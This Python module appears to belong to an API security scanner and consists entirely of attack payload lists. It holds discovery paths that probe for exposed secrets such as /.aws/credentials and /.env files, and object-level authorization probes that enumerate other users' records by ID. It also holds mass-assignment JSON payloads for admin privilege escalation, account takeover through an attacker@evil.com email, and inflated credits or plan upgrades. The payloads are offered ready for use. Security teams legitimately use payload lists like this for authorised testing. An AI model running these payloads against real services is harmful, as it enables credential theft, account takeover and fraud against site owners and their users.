"""api.py — REST API Security Discovery & Attack Payloads"""

# ─────────────────────────────────────────────
# API Discovery Paths
# ─────────────────────────────────────────────
API_DISCOVERY_PATHS: list[str] = [
    # Version discovery
    "/api/v1/",
    "/api/v2/",
    "/api/v3/",
    "/api/",
    "/v1/",
    "/v2/",
    "/v3/",
    # Documentation
    "/swagger.json",
    "/swagger.yaml",
    "/openapi.json",
    "/openapi.yaml",
    "/api-docs",
    "/api-docs/",
    "/api/docs",
    "/docs",
    "/redoc",
    "/.well-known/",
    # Health / status
    "/health",
    "/healthz",
    "/health/check",
    "/status",
    "/ping",
    "/metrics",
    "/actuator",
    "/actuator/health",
    "/actuator/env",
    "/actuator/mappings",
    "/actuator/beans",
    "/actuator/info",
    # Admin endpoints
    "/admin",
    "/admin/",
    "/admin/api",
    "/api/admin",
    "/api/admin/users",
    "/management",
    "/manage",
    "/console",
    # User endpoints
    "/api/users",
    "/api/users/me",
    "/api/user",
    "/api/profile",
    "/api/account",
    "/api/accounts",
    # Auth endpoints
    "/api/auth",
    "/api/login",
    "/api/register",
    "/api/token",
    "/api/refresh",
    "/oauth/token",
    "/auth/token",
    # Debug
    "/debug",
    "/debug/vars",
    "/api/debug",
    "/__debug__/",
    "/trace",
    # Config
    "/config",
    "/config.json",
    "/env",
    "/environment",
    # GraphQL
    "/graphql",
    "/api/graphql",
    "/gql",
    # gRPC
    "/grpc",
    "/grpcweb",
    # Monitoring
    "/prometheus",
    "/metrics",
    "/_metrics",
    "/stats",
    # AWS
    "/.aws/credentials",
    "/.aws/config",
    # Environment files
    "/.env",
    "/.env.local",
    "/.env.production",
    "/.env.development",
    # Package files
    "/package.json",
    "/composer.json",
    "/requirements.txt",
    "/Gemfile",
    "/go.mod",
]

# ─────────────────────────────────────────────
# BOLA — Broken Object Level Authorization
# ─────────────────────────────────────────────
API_BOLA_PATTERNS: list[str] = [
    # Sequential ID probes
    "/api/users/{id}",
    "/api/users/{id}/profile",
    "/api/users/{id}/settings",
    "/api/users/{id}/orders",
    "/api/users/{id}/payment",
    "/api/orders/{id}",
    "/api/invoices/{id}",
    "/api/documents/{id}",
    "/api/files/{id}",
    "/api/reports/{id}",
    # UUID probes
    "/api/users/00000000-0000-0000-0000-000000000001",
    "/api/users/00000000-0000-0000-0000-000000000002",
    # Admin-only endpoints
    "/api/admin/users/{id}",
    "/api/admin/users/{id}/delete",
    "/api/admin/users/{id}/promote",
    # Object type confusion
    "/api/v1/users/1/admin",
    "/api/v1/admin/users/1",
    # Encoded IDs
    "/api/users/MQ==",    # base64('1')
    "/api/users/Mg==",    # base64('2')
    "/api/users/%31",     # URL encoded '1'
    "/api/users/%32",     # URL encoded '2'
]

# ─────────────────────────────────────────────
# Mass Assignment Payloads
# ─────────────────────────────────────────────
API_MASS_ASSIGNMENT: list[str] = [
    # Role/privilege escalation
    '{"role":"admin"}',
    '{"isAdmin":true}',
    '{"admin":true}',
    '{"is_admin":1}',
    '{"user_type":"admin"}',
    '{"permissions":["admin","read","write","delete"]}',
    '{"role":"superuser"}',
    '{"group":"admin"}',
    # Account takeover
    '{"email":"attacker@evil.com","verified":true}',
    '{"password":"hacked","confirm_password":"hacked"}',
    '{"email_verified":true}',
    '{"phone_verified":true}',
    # Billing/subscription
    '{"subscription":"enterprise"}',
    '{"plan":"pro"}',
    '{"credits":999999}',
    '{"balance":9999.99}',
    '{"tier":"premium"}',
    # Internal fields
    '{"_id":"000000000000000000000001"}',
    '{"id":1,"username":"admin"}',
    '{"createdAt":"2020-01-01","updatedAt":"2020-01-01"}',
    '{"banned":false,"active":true}',
    # Django / Rails model attributes
    '{"is_staff":true,"is_superuser":true}',
    '{"confirmed":true,"locked":false}',
]
